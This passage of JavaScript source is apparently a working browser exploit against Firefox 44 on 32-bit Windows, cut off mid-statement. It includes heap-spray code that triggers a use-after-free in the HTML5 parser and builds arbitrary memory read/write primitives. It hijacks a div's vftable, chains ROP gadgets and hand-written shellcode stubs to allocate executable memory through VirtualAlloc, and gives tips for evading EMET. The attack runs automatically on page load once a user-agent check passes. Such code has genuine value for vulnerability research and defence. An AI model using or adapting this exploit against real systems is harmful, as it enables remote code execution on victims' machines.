because we want `flProtect\' to be PAGE_EXECUTE_READWRITE,\r\n     * we also have to have a `size\' with the same value; meaning our\r\n     * rwx allocation will only be 0x40 bytes.\r\n     *\r\n     * This is not a problem, since we can simply write a small snippet\r\n     * of shellcode that allocates a larger region in a non-ROPy way\r\n     * afterwards.\r\n     */\r\n    this.uprv_malloc_55 = function(stackAddr) {\r\n        const func = this.kernel32.GetProcAddress(this.icuuc55handle,\r\n                                                  "uprv_malloc_55");\r\n        const ret = this.rwx.calloc(4);\r\n        const u32array = this.rwx.u32array;\r\n\r\n        /**********************\r\n         * second stage gadgets\r\n         **********************/\r\n        const stackGadgets = new Array(\r\n            func,\r\n\r\n            0x1000,     /* [A] flAllocationType (MEM_COMMIT) */\r\n            0x40,       /* [B] dwSize and flProtect (PAGE_EXECUTE_READWRITE) */\r\n            0x41414141, /* [C] */\r\n            0x42424242, /* [D] */\r\n\r\n            /*\r\n             * location to write the return value\r\n             *\r\n             * pop ecx\r\n             * ret\r\n             */\r\n            this.rop.search([0x59, 0xc3]),\r\n            ret.addr,\r\n\r\n            /*\r\n             * do the write\r\n             *\r\n             * mov dword [ecx], eax\r\n             * ret\r\n             */\r\n            this.rop.search([0x89, 0x01, 0xc3]),\r\n\r\n            /*\r\n             * restore the old stack\r\n             *\r\n             * mov esp, edi\r\n             * ret\r\n             */\r\n            this.rop.search([0x89, 0xfc, 0xc3])\r\n        );\r\n\r\n        const origStack = this.rwx.readDWords(stackAddr, stackGadgets.length);\r\n        this.rwx.writeDWords(stackAddr, stackGadgets);\r\n\r\n\r\n        /*********************\r\n         * first stage gadgets\r\n         *********************/\r\n        /*\r\n         * pivot\r\n         *\r\n         * xchg eax, esp\r\n         * ret 0x2de8\r\n         */\r\n        const pivot = this.rop.search([0x94, 0xc2, 0xe8, 0x2d]);\r\n\r\n        /*\r\n         * preserve old esp in a nonvolatile register\r\n         *\r\n         * xchg eax, edi\r\n         * ret\r\n         */\r\n        const after = this.rop.search([0x97, 0xc3]);\r\n\r\n        /*\r\n         * pivot to the second stage\r\n         *\r\n         * pop esp\r\n         * ret\r\n         */\r\n        u32array[this.rwx.div.mem.idx + 2941] = this.rop.search([0x5c, 0xc3]);\r\n        u32array[this.rwx.div.mem.idx + 2942] = stackAddr;\r\n\r\n        /*\r\n         * here we go :)\r\n         */\r\n        this.rwx.execute(pivot, after);\r\n        this.rwx.writeDWords(stackAddr, origStack);\r\n\r\n        if (u32array[ret.idx] === 0) {\r\n            throw new Error("uprv_malloc_55() failed");\r\n        }\r\n        return u32array[ret.idx];\r\n    };\r\n\r\n    /*\r\n     * Overrides the pointers in firefox-44.0.2/intl/icu/source/common/cmemory.c\r\n     */\r\n    this.u_setMemoryFunctions_55 = function(context, a, r, f, status) {\r\n        const func = this.kernel32.GetProcAddress(this.icuuc55handle,\r\n                                                  "u_setMemoryFunctions_55");\r\n        this.rop.execute(func, [context, a, r, f, status], true);\r\n    };\r\n\r\n    /*\r\n     * Sets `pAlloc\' to VirtualAlloc.  `pRealloc\' and `pFree\' are\r\n     * set to point to small gadgets.\r\n     */\r\n    this.set = function() {\r\n        const status = this.rwx.calloc(4);\r\n        const alloc = this.pe.search("kernel32.dll", "VirtualAlloc");\r\n\r\n        /* pretend to be a failed reallocation\r\n         *\r\n         * xor eax, eax\r\n         * ret */\r\n        const realloc = this.rop.search([0x33, 0xc0, 0xc3]);\r\n\r\n        /* let the chunk live\r\n         *\r\n         * ret */\r\n        const free = this.rop.search([0xc3]);\r\n\r\n        this.u_setMemoryFunctions_55(0, alloc, realloc, free, status.addr);\r\n        if (this.rwx.u32array[status.idx] !== 0) {\r\n            throw new Error("u_setMemoryFunctions_55() failed");\r\n        }\r\n    };\r\n\r\n    /*\r\n     * This (sort of) restores the functionality in\r\n     * intl/icu/source/common/cmemory.c by reusing the previously\r\n     * allocated PAGE_EXECUTE_READWRITE chunk to set up three stubs that\r\n     * invokes an appropriate function in mozglue.dll\r\n     */\r\n    this.reset = function(chunk) {\r\n        const u32array = this.rwx.u32array;\r\n        const status = this.rwx.calloc(4);\r\n\r\n        /*\r\n         * pFree\r\n         */\r\n        const free = {};\r\n        free.addr = chunk;\r\n        free.func = this.rwx.calloc(4);\r\n        free.func.str = this.dword2str(free.func.addr);\r\n        free.code = [\r\n            "\\x8b\\x84\\x24\\x08\\x00\\x00\\x00", /* mov eax, dword [esp + 0x8] */\r\n            "\\x50",                         /* push eax */\r\n            "\\x8b\\x05" + free.func.str,     /* mov eax, [location-of-free] */\r\n            "\\xff\\xd0",                     /* call eax */\r\n            "\\x59",                         /* pop ecx */\r\n            "\\xc3",                         /* ret */\r\n        ].join("");\r\n        u32array[free.func.idx] = this.pe.search("mozglue.dll", "free");\r\n        this.rwx.writeString(free.addr, free.code);\r\n\r\n        /*\r\n         * pAlloc\r\n         */\r\n        const alloc = {};\r\n        alloc.addr = chunk + free.code.length;\r\n        alloc.func = this.rwx.calloc(4);\r\n        alloc.func.str = this.dword2str(alloc.func.addr);\r\n        alloc.code = [\r\n            "\\x8b\\x84\\x24\\x08\\x00\\x00\\x00", /* mov eax, dword [esp + 0x8] */\r\n            "\\x50",                         /* push eax */\r\n            "\\x8b\\x05" + alloc.func.str,    /* mov eax, [location-of-alloc] */\r\n            "\\xff\\xd0",                     /* call eax */\r\n            "\\x59",                         /* pop ecx */\r\n            "\\xc3",                         /* ret */\r\n        ].join("");\r\n        u32array[alloc.func.idx] = this.pe.search("mozglue.dll", "malloc");\r\n        this.rwx.writeString(alloc.addr, alloc.code);\r\n\r\n        /*\r\n         * pRealloc\r\n         */\r\n        const realloc = {};\r\n        realloc.addr = chunk + free.code.length + alloc.code.length;\r\n        realloc.func = this.rwx.calloc(4);\r\n        realloc.func.str = this.dword2str(realloc.func.addr);\r\n        realloc.code = [\r\n            "\\x8b\\x84\\x24\\x0c\\x00\\x00\\x00", /* mov eax, dword [esp + 0xc] */\r\n            "\\x50",                         /* push eax */\r\n            "\\x8b\\x84\\x24\\x0c\\x00\\x00\\x00", /* mov eax, dword [esp + 0xc] */\r\n            "\\x50",                         /* push eax */\r\n            "\\x8b\\x05" + realloc.func.str,  /* mov eax, [location-of-realloc] */\r\n            "\\xff\\xd0",                     /* call eax */\r\n            "\\x59",                         /* pop ecx */\r\n            "\\x59",                         /* pop ecx */\r\n            "\\xc3",                         /* ret */\r\n        ].join("");\r\n        u32array[realloc.func.idx] = this.pe.search("mozglue.dll", "realloc");\r\n        this.rwx.writeString(realloc.addr, realloc.code);\r\n\r\n        this.u_setMemoryFunctions_55(0,\r\n                                     alloc.addr,\r\n                                     realloc.addr,\r\n                                     free.addr,\r\n                                     status.addr);\r\n        if (u32array[status.idx] !== 0) {\r\n            throw new Error("u_setMemoryFunctions_55() failed");\r\n        }\r\n    };\r\n\r\n    /*\r\n     * Allocates a small chunk of memory marked RWX, which is used\r\n     * to allocate a `size\'-byte chunk (see uprv_malloc_55()).  The\r\n     * first allocation is then repurposed in reset().\r\n     */\r\n    this.alloc = function(stackAddr, size) {\r\n        /*\r\n         * hijack the function pointers\r\n         */\r\n        this.set();\r\n\r\n        /*\r\n         * do the initial 0x40 byte allocation\r\n         */\r\n        const chunk = this.uprv_malloc_55(stackAddr);\r\n        log("allocated 0x40 byte chunk at 0x" + chunk.toString(16));\r\n\r\n        /*\r\n         * allocate a larger chunk now that we\'re no longer limited to ROP/JOP\r\n         */\r\n        const u32array = this.rwx.u32array;\r\n        const func = this.rwx.calloc(4);\r\n        func.str = this.dword2str(func.addr);\r\n        u32array[func.idx] = this.pe.search("kernel32.dll", "VirtualAlloc");\r\n        const code = [\r\n            "\\x87\\xe7",                    /* xchg edi, esp (orig stack) */\r\n            "\\x6a\\x40",                    /* push 0x40 (flProtect) */\r\n            "\\x68\\x00\\x10\\x00\\x00",        /* push 0x1000 (flAllocationType) */\r\n            "\\xb8" + this.dword2str(size), /* move eax, size */\r\n            "\\x50",                        /* push eax (dwSize) */\r\n            "\\x6a\\x00",                    /* push 0 (lpAddress) */\r\n            "\\x8b\\x05" + func.str,         /* mov eax, [loc-of-VirtualAlloc] */\r\n            "\\xff\\xd0",                    /* call eax */\r\n            "\\x87\\xe7",                    /* xchg edi, esp (back to heap) */\r\n            "\\xc3",                        /* ret */\r\n        ].join("");\r\n        this.rwx.writeString(chunk, code);\r\n        const newChunk = this.rop.execute(chunk, [], false);\r\n        log("allocated " + size + " byte chunk at 0x" + newChunk.toString(16));\r\n\r\n        /*\r\n         * repurpose the first rwx chunk to restore functionality\r\n         */\r\n        this.reset(chunk);\r\n\r\n        return newChunk;\r\n    };\r\n\r\n    this.dword2str = function(dword) {\r\n        let str = "";\r\n        for (let i = 0; i < 4; i++) {\r\n            str += String.fromCharCode((dword >> 8 * i) & 0xff);\r\n        }\r\n        return str;\r\n    };\r\n}\r\n\r\nfunction KERNEL32(rop, pe, rwx) {\r\n    this.rop = rop;\r\n    this.pe = pe;\r\n    this.rwx = rwx;\r\n\r\n    /*\r\n     * Retrieves a handle for an imported module\r\n     */\r\n    this.GetModuleHandleA = function(lpModuleName) {\r\n        const func = this.pe.search("kernel32.dll", "GetModuleHandleA");\r\n        const name = this.rwx.copyString(lpModuleName);\r\n        const module = this.rop.execute(func, [name.addr], false);\r\n        if (module === 0) {\r\n            throw new Error("could not get a handle for " + lpModuleName);\r\n        }\r\n        return module;\r\n    };\r\n\r\n    /*\r\n     * Retrieves the address of an exported symbol.  Do not invoke this\r\n     * function on protected modules (if you want to bypass EAF); instead\r\n     * try to locate the symbol in any of the import tables or choose\r\n     * another target.\r\n     */\r\n    this.GetProcAddress = function(hModule, lpProcName) {\r\n        const func = this.pe.search("kernel32.dll", "GetProcAddress");\r\n        const name = this.rwx.copyString(lpProcName);\r\n        const addr = this.rop.execute(func, [hModule, name.addr], false);\r\n        if (addr === 0) {\r\n            throw new Error("could not get address for " + lpProcName);\r\n        }\r\n        return addr;\r\n    };\r\n\r\n    /*\r\n     * Retrieves a handle for the current thread\r\n     */\r\n    this.GetCurrentThread = function() {\r\n        const func = this.pe.search("kernel32.dll", "GetCurrentThread");\r\n        return this.rop.execute(func, [], false);\r\n    };\r\n}\r\n\r\nfunction NTDLL(rop, pe, rwx) {\r\n    this.rop = rop;\r\n    this.pe = pe;\r\n    this.rwx = rwx;\r\n\r\n    /*\r\n     * Retrieves the stack limit from the Thread Environment Block\r\n     */\r\n    this.getStackLimit = function(ThreadHandle) {\r\n        const mem = this.rwx.calloc(0x1c);\r\n        this.NtQueryInformationThread(ThreadHandle, 0, mem.addr, mem.size, 0);\r\n        return this.rwx.readDWord(this.rwx.u32array[mem.idx+1] + 8);\r\n    };\r\n\r\n    /*\r\n     * Retrieves thread information\r\n     */\r\n    this.NtQueryInformationThread = function(ThreadHandle,\r\n                                             ThreadInformationClass,\r\n                                             ThreadInformation,\r\n                                             ThreadInformationLength,\r\n                                             ReturnLength) {\r\n        const func = this.pe.search("ntdll.dll", "NtQueryInformationThread");\r\n        const ret = this.rop.execute(func, arguments, false);\r\n        if (ret !== 0) {\r\n            throw new Error("NtQueryInformationThread failed");\r\n        }\r\n        return ret;\r\n    };\r\n}\r\n\r\nfunction ReadWriteExecute(u32base, u32array, array) {\r\n    this.u32base = u32base;\r\n    this.u32array = u32array;\r\n    this.array = array;\r\n\r\n    /*\r\n     * Reads `length\' bytes from `addr\' through a fake string\r\n     */\r\n    this.readBytes = function(addr, length) {\r\n        /* create a string-jsval */\r\n        this.u32array[4] = this.u32base + 6*4;   /* addr to meta */\r\n        this.u32array[5] = 0xffffff85;           /* type (JSVAL_TAG_STRING) */\r\n\r\n        /* metadata */\r\n        this.u32array[6] = 0x49;   /* flags */\r\n        this.u32array[7] = length; /* read size */\r\n        this.u32array[8] = addr;   /* memory to read */\r\n\r\n        /* Uint8Array is *significantly* slower, which kills our ROP hunting */\r\n        const result = new Array();\r\n\r\n        const str = this.getArrayElem(4);\r\n        for (let i = 0; i < str.length; i++) {\r\n            result[i] = str.charCodeAt(i);\r\n        }\r\n\r\n        return result;\r\n    };\r\n\r\n    this.readDWords = function(addr, num) {\r\n        const bytes = this.readBytes(addr, num * 4);\r\n        const dwords = new Uint32Array(num);\r\n        for (let i = 0; i < bytes.length; i += 4) {\r\n            for (let j = 0; j < 4; j++) {\r\n                dwords[i/4] |= bytes[i+j] << (8 * j);\r\n            }\r\n        }\r\n        return dwords;\r\n    };\r\n\r\n    this.readDWord = function(addr) {\r\n        return this.readDWords(addr, 1)[0];\r\n    };\r\n\r\n    this.readWords = function(addr, num) {\r\n        const bytes = this.readBytes(addr, num * 2);\r\n        const words = new Uint16Array(num);\r\n        for (let i = 0; i < bytes.length; i += 2) {\r\n            for (let j = 0; j < 2; j++) {\r\n                words[i/2] |= bytes[i+j] << (8 * j);\r\n            }\r\n        }\r\n        return words;\r\n    };\r\n\r\n    this.readWord = function(addr) {\r\n        return this.readWords(addr, 1)[0];\r\n    };\r\n\r\n    this.readString = function(addr) {\r\n        for (let i = 0, str = ""; ; i++) {\r\n            const chr = this.readBytes(addr + i, 1)[0];\r\n            if (chr === 0) {\r\n                return str;\r\n            }\r\n            str += String.fromCharCode(chr);\r\n        }\r\n    };\r\n\r\n    /*\r\n     * Writes `values\' to `addr\' by using the metadata of an Uint8Array\r\n     * to set up a write primitive\r\n     */\r\n    this.writeBytes = function(addr, values) {\r\n        /* create jsval */\r\n        const jsMem = this.calloc(8);\r\n        this.setArrayElem(jsMem.idx, new Uint8Array(values.length));\r\n\r\n        /* copy metadata */\r\n        const meta = this.readDWords(this.u32array[jsMem.idx], 12);\r\n        const metaMem = this.calloc(meta.length * 4);\r\n        for (let i = 0; i < meta.length; i++) {\r\n            this.u32array[metaMem.idx + i] = meta[i];\r\n        }\r\n\r\n        /* change the pointer to the contents of the Uint8Array */\r\n        this.u32array[metaMem.idx + 10] = addr;\r\n\r\n        /* change the pointer to the metadata */\r\n        const oldMeta = this.u32array[jsMem.idx];\r\n        this.u32array[jsMem.idx] = metaMem.addr;\r\n\r\n        /* write */\r\n        const u8 = this.getArrayElem(jsMem.idx);\r\n        for (let i = 0; i < values.length; i++) {\r\n            u8[i] = values[i];\r\n        }\r\n\r\n        /* clean up */\r\n        this.u32array[jsMem.idx] = oldMeta;\r\n    };\r\n\r\n    this.writeDWords = function(addr, values) {\r\n        const u8 = new Uint8Array(values.length * 4);\r\n        for (let i = 0; i < values.length; i++) {\r\n            for (let j = 0; j < 4; j++) {\r\n                u8[i*4 + j] = values[i] >> (8 * j) & 0xff;\r\n            }\r\n        }\r\n        this.writeBytes(addr, u8);\r\n    };\r\n\r\n    this.writeDWord = function(addr, value) {\r\n        const u32 = new Uint32Array(1);\r\n        u32[0] = value;\r\n        this.writeDWords(addr, u32);\r\n    };\r\n\r\n    this.writeString = function(addr, str) {\r\n        const u8 = new Uint8Array(str.length);\r\n\r\n        for (let i = 0; i < str.length; i++) {\r\n            u8[i] = str.charCodeAt(i);\r\n        }\r\n        this.writeBytes(addr, u8);\r\n    };\r\n\r\n    /*\r\n     * Copies a string to the `u32array\' and returns an object from\r\n     * calloc().\r\n     *\r\n     * This is an ugly workaround to allow placing a string at a known\r\n     * location without having to implement proper support for JSString\r\n     * and its various string types.\r\n     */\r\n    this.copyString = function(str) {\r\n        str += "\\x00".repeat(4 - str.length % 4);\r\n        const mem = this.calloc(str.length);\r\n\r\n        for (let i = 0, j = 0; i < str.length; i++) {\r\n            if (i && !(i % 4)) {\r\n                j++;\r\n            }\r\n            this.u32array[mem.idx + j] |= str.charCodeAt(i) << (8 * (i % 4));\r\n        }\r\n        return mem;\r\n    };\r\n\r\n    /*\r\n     * Creates a <div> and copies the contents of its vftable to\r\n     * writable memory.\r\n     */\r\n    this.createExecuteDiv = function() {\r\n        const div = {};\r\n\r\n        /* 0x3000 bytes should be enough for the div, vftable and gadgets */\r\n        div.mem = this.calloc(0x3000);\r\n\r\n        div.elem = document.createElement("div");\r\n        this.setArrayElem(div.mem.idx, div.elem);\r\n\r\n        /* addr of the div */\r\n        const addr = this.u32array[div.mem.idx];\r\n\r\n        /* *(addr+4) = this */\r\n        const ths = this.readDWord(addr + 4*4);\r\n\r\n        /* *this = xul!mozilla::dom::HTMLDivElement::`vftable\' */\r\n        const vftable = this.readDWord(ths);\r\n\r\n        /* copy the vftable (the size is a guesstimate) */\r\n        const entries = this.readDWords(vftable, 512);\r\n        this.writeDWords(div.mem.addr + 4*2, entries);\r\n\r\n        /* replace the pointer to the original vftable with ours */\r\n        this.writeDWord(ths, div.mem.addr + 4*2);\r\n\r\n        return div;\r\n    };\r\n\r\n    /*\r\n     * Replaces two vftable entries of the previously created div and\r\n     * triggers code execution\r\n     */\r\n    this.execute = function(pivot, postPivot) {\r\n        /* vftable entry for xul!nsGenericHTMLElement::QueryInterface\r\n         * kind of ugly, but we\'ll land here after the pivot that\'s used\r\n         * in ROPHelper.execute() */\r\n        const savedQueryInterface = this.u32array[this.div.mem.idx + 2];\r\n        this.u32array[this.div.mem.idx + 2] = postPivot;\r\n\r\n        /* vftable entry for xul!nsGenericHTMLElement::Click */\r\n        const savedClick = this.u32array[this.div.mem.idx + 131];\r\n        this.u32array[this.div.mem.idx + 131] = pivot;\r\n\r\n        /* execute */\r\n        this.div.elem.click();\r\n\r\n        /* restore our overwritten vftable pointers */\r\n        this.u32array[this.div.mem.idx + 2] = savedQueryInterface;\r\n        this.u32array[this.div.mem.idx + 131] = savedClick;\r\n    };\r\n\r\n    /*\r\n     * Reserves space in the `u32array\' and initializes it to 0.\r\n     *\r\n     * Returns an object with the following properties:\r\n     * - idx: index of the start of the allocation in the u32array\r\n     * - addr: start address of the allocation\r\n     * - size: non-padded allocation size\r\n     * - realSize: padded size\r\n     */\r\n    this.calloc = function(size) {\r\n        let padded = size;\r\n        if (!size || size % 4) {\r\n            padded += 4 - size % 4;\r\n        }\r\n\r\n        const found = [];\r\n        /* the first few dwords are reserved for the metadata belonging\r\n         * to `this.array\' and for the JSString in readBytes (since using\r\n         * this function would impact the speed of the ROP hunting) */\r\n        for (let i = 10; i < this.u32array.length - 1; i += 2) {\r\n            if (this.u32array[i] === 0x11223344 &&\r\n                this.u32array[i+1] === 0x55667788) {\r\n                found.push(i, i+1);\r\n                if (found.length >= padded / 4) {\r\n                    for (let j = 0; j < found.length; j++) {\r\n                        this.u32array[found[j]] = 0;\r\n                    }\r\n                    return {\r\n                        idx: found[0],\r\n                        addr: this.u32base + found[0]*4,\r\n                        size: size,\r\n                        realSize: padded,\r\n                    };\r\n                }\r\n            } else {\r\n                found.length = 0;\r\n            }\r\n        }\r\n        throw new Error("calloc(): out of memory");\r\n    };\r\n\r\n    /*\r\n     * Returns an element in `array\' based on an index for `u32array\'\r\n     */\r\n    this.getArrayElem = function(idx) {\r\n        if (idx <= 3 || idx % 2) {\r\n            throw new Error("invalid index");\r\n        }\r\n        return this.array[(idx - 4) / 2];\r\n    };\r\n\r\n    /*\r\n     * Sets an element in `array\' based on an index for `u32array\'\r\n     */\r\n    this.setArrayElem = function(idx, value) {\r\n        if (idx <= 3 || idx % 2) {\r\n            throw new Error("invalid index");\r\n        }\r\n        this.array[(idx - 4) / 2] = value;\r\n    };\r\n\r\n    this.div = this.createExecuteDiv();\r\n}\r\n\r\nfunction PortableExecutable(base, rwx) {\r\n    this.base = base;\r\n    this.rwx = rwx;\r\n    this.imports = {};\r\n    this.text = {};\r\n\r\n    /*\r\n     * Parses the PE import table.  Some resources of interest:\r\n     *\r\n     * - An In-Depth Look into the Win32 Portable Executable File Format\r\n     *   https://msdn.microsoft.com/en-us/magazine/bb985992(printer).aspx\r\n     *\r\n     * - Microsoft Portable Executable and Common Object File Format Specification\r\n     *   https://www.microsoft.com/en-us/download/details.aspx?id=19509\r\n     *\r\n     * - Understanding the Import Address Table\r\n     *   http://sandsprite.com/CodeStuff/Understanding_imports.html\r\n     */\r\n    this.read = function() {\r\n        const rwx = this.rwx;\r\n        let addr = this.base;\r\n\r\n        /*\r\n         * DOS header\r\n         */\r\n        const magic = rwx.readWord(addr);\r\n        if (magic !== 0x5a4d) {\r\n            throw new Error("bad DOS header");\r\n        }\r\n        const lfanew = rwx.readDWord(addr + 0x3c, 4);\r\n        addr += lfanew;\r\n\r\n        /*\r\n         * Signature\r\n         */\r\n        const signature = rwx.readDWord(addr);\r\n        if (signature !== 0x00004550) {\r\n            throw new Error("bad signature");\r\n        }\r\n        addr += 4;\r\n\r\n        /*\r\n         * COFF File Header\r\n         */\r\n        addr += 20;\r\n\r\n        /*\r\n         * Optional Header\r\n         */\r\n        const optionalMagic = rwx.readWord(addr);\r\n        if (optionalMagic !== 0x010b) {\r\n            throw new Error("bad optional header");\r\n        }\r\n\r\n        this.text.size = rwx.readDWord(addr + 4);\r\n        this.text.base = this.base + rwx.readDWord(addr + 20);\r\n\r\n        const numberOfRvaAndSizes = rwx.readDWord(addr + 92);\r\n        addr += 96;\r\n\r\n        /*\r\n         * Optional Header Data Directories\r\n         *\r\n         * N entries * 2 DWORDs (RVA and size)\r\n         */\r\n        const directories = rwx.readDWords(addr, numberOfRvaAndSizes * 2);\r\n\r\n        for (let i = 0; i < directories[3] - 5*4; i += 5*4) {\r\n            /* Import Directory Table (N entries * 5 DWORDs) */\r\n            const members = rwx.readDWords(this.base + directories[2] + i, 5);\r\n            const lookupTable = this.base + members[0];\r\n            const dllName = rwx.readString(this.base+members[3]).toLowerCase();\r\n            const addrTable = this.base + members[4];\r\n\r\n            this.imports[dllName] = {};\r\n\r\n            /* Import Lookup Table */\r\n            for (let j = 0; ; j += 4) {\r\n                const hintNameRva = rwx.readDWord(lookupTable + j);\r\n                /* the last entry is NULL */\r\n                if (hintNameRva === 0) {\r\n                    break;\r\n                }\r\n\r\n                /* name is not available if the dll is imported by ordinal */\r\n                if (hintNameRva & (1 << 31)) {\r\n                    continue;\r\n                }\r\n\r\n                const importName = rwx.readString(this.base + hintNameRva + 2);\r\n                const importAddr = rwx.readDWord(addrTable + j);\r\n                this.imports[dllName][importName] = importAddr;\r\n            }\r\n        }\r\n    };\r\n\r\n    /*\r\n     * Searches for an imported symbol\r\n     */\r\n    this.search = function(dll, symbol) {\r\n        if (this.imports[dll] === undefined) {\r\n            throw new Error("unknown dll: " + dll);\r\n        }\r\n\r\n        const addr = this.imports[dll][symbol];\r\n        if (addr === undefined) {\r\n            throw new Error("unknown symbol: " + symbol);\r\n        }\r\n        return addr;\r\n    };\r\n}\r\n\r\nfunction Spray() {\r\n    this.nodeBase = 0x80000000;\r\n    this.ptrNum = 64;\r\n    this.refcount = 0xffffffff;\r\n    /*\r\n     * 0:005> ?? sizeof(nsHtml5StackNode)\r\n     * unsigned int 0x1c\r\n     */\r\n    this.nsHtml5StackNodeSize = 0x1c;\r\n\r\n    /*\r\n     * Creates a bunch of fake nsHtml5StackNode:s with the hope of hitting\r\n     * the address of elementName->name when it\'s [xul!nsHtml5Atoms::style].\r\n     *\r\n     * Ultimately, the goal is to enter the conditional on line 2743:\r\n     *\r\n     * firefox-44.0.2/parser/html/nsHtml5TreeBuilder.cpp:2743\r\n     * ,----\r\n     * | 2214 void\r\n     * | 2215 nsHtml5TreeBuilder::endTag(nsHtml5ElementName* elementName)\r\n     * | 2216 {\r\n     * | ....\r\n     * | 2221   nsIAtom* name = elementName->name;\r\n     * | ....\r\n     * | 2741   for (; ; ) {\r\n     * | 2742     nsHtml5StackNode* node = stack[eltPos];\r\n     * | 2743     if (node->ns == kNameSpaceID_XHTML && node->name == name) {\r\n     * | ....\r\n     * | 2748       while (currentPtr >= eltPos) {\r\n     * | 2749         pop();\r\n     * | 2750       }\r\n     * | 2751       NS_HTML5_BREAK(endtagloop);\r\n     * | 2752     } else if (node->isSpecial()) {\r\n     * | 2753       errStrayEndTag(name);\r\n     * | 2754       NS_HTML5_BREAK(endtagloop);\r\n     * | 2755     }\r\n     * | 2756     eltPos--;\r\n     * | 2757   }\r\n     * | ....\r\n     * | 3035 }\r\n     * `----\r\n     *\r\n     * We get 64 attempts each time the bug is triggered -- however, in\r\n     * order to have a clean break, the last node has its flags set to\r\n     * NS_HTML5ELEMENT_NAME_SPECIAL, so that the conditional on line\r\n     * 2752 is entered.\r\n     *\r\n     * If we do find ourselves with a node->name == name, then\r\n     * nsHtml5TreeBuilder::pop() invokes nsHtml5StackNode::release().\r\n     * The release() method decrements the nodes refcount -- and, if the\r\n     * refcount reaches 0, also deletes it.\r\n     *\r\n     * Assuming everything goes well, the Uint32Array is allocated with\r\n     * the method presented by SkyLined/@berendjanwever in:\r\n     *\r\n     * "Heap spraying high addresses in 32-bit Chrome/Firefox on 64-bit Windows"\r\n     * http://blog.skylined.nl/20160622001.html\r\n     */\r\n    this.nodes = function(name, bruteforce) {\r\n        const nodes = new Uint32Array(0x19000000);\r\n        const size = this.nsHtml5StackNodeSize / 4;\r\n        const refcount = bruteforce ? this.refcount : 1;\r\n        let flags = 0;\r\n\r\n        for (let i = 0; i < this.ptrNum * size; i += size) {\r\n            if (i === (this.ptrNum - 1) * size) {\r\n                flags = 1 << 29; /* NS_HTML5ELEMENT_NAME_SPECIAL */\r\n                name = 0x0;\r\n            }\r\n            nodes[i] = flags;\r\n            nodes[i+1] = name;\r\n            nodes[i+2] = 0; /* popName */\r\n            nodes[i+3] = 3; /* ns (kNameSpaceID_XHTML) */\r\n            nodes[i+4] = 0; /* node */\r\n            nodes[i+5] = 0; /* attributes */\r\n            nodes[i+6] = refcount;\r\n            name += 0x100000;\r\n        }\r\n        return nodes;\r\n    };\r\n\r\n    /*\r\n     * Sprays pointers to the fake nsHtml5StackNode:s created in nodes()\r\n     */\r\n    this.pointers = function() {\r\n        const pointers = new Array();\r\n\r\n        for (let i = 0; i < 0x30000; i++) {\r\n            pointers[i] = new Uint32Array(this.ptrNum);\r\n            let node = this.nodeBase;\r\n            for (let j = pointers[i].length - 1; j >= 0; j--) {\r\n                pointers[i][j] = node;\r\n                node += this.nsHtml5StackNodeSize;\r\n            }\r\n        }\r\n        return pointers;\r\n    };\r\n\r\n    /*\r\n     * Sprays a bunch of arrays with the goal of having one hijack the\r\n     * previously freed Uint32Array\r\n     */\r\n    this.arrays = function() {\r\n        const array = new Array();\r\n\r\n        for (let i = 0; i < 0x800; i++) {\r\n            array[i] = new Array();\r\n            for (let j = 0; j < 0x10000; j++) {\r\n                /* 0x11223344, 0x55667788 */\r\n                array[i][j] = 2.5160082934009793e+103;\r\n            }\r\n        }\r\n        return array;\r\n    };\r\n\r\n    /*\r\n     * Not sure how reliable this is, but on 3 machines running win10 on\r\n     * bare metal and on a few VMs with win7/win10 (all with and without\r\n     * EMET), [xul!nsHtml5Atoms::style] was always found within\r\n     * 0x[00a-1c2]f[a-f]6(c|e)0\r\n     */\r\n    this.getNextAddr = function(current) {\r\n        const start = 0x00afa6c0;\r\n\r\n        if (!current) {\r\n            return start;\r\n        }\r\n\r\n        if ((current >> 20) < 0x150) {\r\n            return current + 0x100000*(this.ptrNum-1);\r\n        }\r\n\r\n        if ((current >> 12 & 0xf) !== 0xf) {\r\n            return (current + 0x1000) & ~(0xfff << 20) | (start >> 20) << 20;\r\n        }\r\n\r\n        if ((current >> 4 & 0xf) === 0xc) {\r\n            return start + 0x20;\r\n        }\r\n        throw new Error("out of guesses");\r\n    };\r\n\r\n    /*\r\n     * Returns the `name\' from the last node with a decremented\r\n     * refcount, if any are found\r\n     */\r\n    this.findStyleAddr = function(nodes) {\r\n        const size = this.nsHtml5StackNodeSize / 4;\r\n\r\n        for (let i = 64 * size - 1; i >= 0; i -= size) {\r\n            if (nodes[i] === this.refcount - 1) {\r\n                return nodes[i-5];\r\n            }\r\n        }\r\n    };\r\n\r\n    /*\r\n     * Locates a subarray in `array\' that overlaps with `nodes\'\r\n     */\r\n    this.findArray = function(nodes, array) {\r\n        /* index 0..3 is metadata for `array\' */\r\n        nodes[4] = 0x41414141;\r\n        nodes[5] = 0x42424242;\r\n\r\n        for (let i = 0; i < array.length; i++) {\r\n            if (array[i][0] === 156842099330.5098) {\r\n                return array[i];\r\n            }\r\n        }\r\n        throw new Error("Uint32Array hijack failed");\r\n    };\r\n}\r\n\r\nfunction log(msg) {\r\n    dump("=> " + msg + "\\n");\r\n    console.log("=> " + msg);\r\n}\r\n\r\nlet nodes;\r\nlet hijacked;\r\nwindow.onload = function() {\r\n    if (!navigator.userAgent.match(/Windows NT [0-9.]+; WOW64; rv:44\\.0/)) {\r\n        throw new Error("unsupported user-agent");\r\n    }\r\n\r\n    const spray = new Spray();\r\n\r\n    /*\r\n     * spray nodes\r\n     */\r\n    let bruteforce = true;\r\n    let addr = spray.getNextAddr(0);\r\n    const href = window.location.href.split("?");\r\n    if (href.length === 2) {\r\n        const query = href[1].split("=");\r\n        if (query[0] === "style") {\r\n            bruteforce = false;\r\n        }\r\n        addr = parseInt(query[1]);\r\n    }\r\n    nodes = spray.nodes(addr, bruteforce);\r\n\r\n    /*\r\n     * spray node pointers and trigger the bug\r\n     */\r\n    document.body.innerHTML = "<svg><img id=\'AAAA\'>";\r\n    const pointers = spray.pointers();\r\n    document.getElementById("AAAA").innerHTML = "<title><template><td><tr><title><i></tr><style>td</style>";\r\n\r\n    /*\r\n     * on to the next run...\r\n     */\r\n    if (bruteforce === true) {\r\n        const style = spray.findStyleAddr(nodes);\r\n        nodes = null;\r\n        if (style) {\r\n            window.location = href[0] + "?style=" + style;\r\n        } else {\r\n            window.location = href[0] + "?continue=" + spray.getNextAddr(addr);\r\n        }\r\n        return;\r\n    }\r\n\r\n    /*\r\n     * reallocate the freed Uint32Array\r\n     */\r\n    hijacked = spray.findArray(nodes, spray.arrays());\r\n\r\n    /*\r\n     * setup helpers\r\n     */\r\n    const rwx = new ReadWriteExecute(spray.nodeBase, nodes, 